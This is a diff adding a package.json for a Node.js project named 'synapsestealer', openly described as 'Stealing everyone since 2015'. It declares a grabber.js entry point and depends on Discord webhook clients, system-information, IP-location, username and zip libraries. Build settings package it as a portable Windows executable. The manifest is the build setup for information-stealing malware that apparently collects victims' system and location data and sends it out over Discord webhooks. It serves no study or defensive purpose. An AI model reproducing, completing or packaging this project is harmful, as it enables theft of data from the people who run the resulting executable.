@@ -1,0 +1,39 @@
+{
+  "name": "synapsestealer",
+  "version": "2.0.0",
+  "author": "lv",
+  "description": "Stealing everyone since 2015",
+  "license": "ISC",
+  "bin": "./grabber.js",
+  "scripts": {
+    "start": "node ./grabber.js"
+  },
+  "dependencies": {
+    "adm-zip": "^0.5.4",
+    "child_process": "^1.0.2",
+    "discord-webhook-node": "^1.1.8",
+    "http": "0.0.1-security",
+    "https": "^1.0.0",
+    "internal-ip": "^6.2.0",
+    "node-iplocate": "^1.0.2",
+    "os": "^0.1.1",
+    "request": "^2.88.2",
+    "systeminformation": "^5.6.10",
+    "username": "^5.1.0",
+    "webhook-discord": "^3.7.7"
+  },
+  "win": {
+    "asar": true,
+    "legalTrademarks": "(c) 2018 example.com",
+    "publisherName": "Example.com",
+    "target": [
+      "portable"
+    ]
+  },
+  "pkg": {
+    "targets": [
+      "node12-win-x64"
+    ],
+    "outputPath": "bin"
+  }
+}
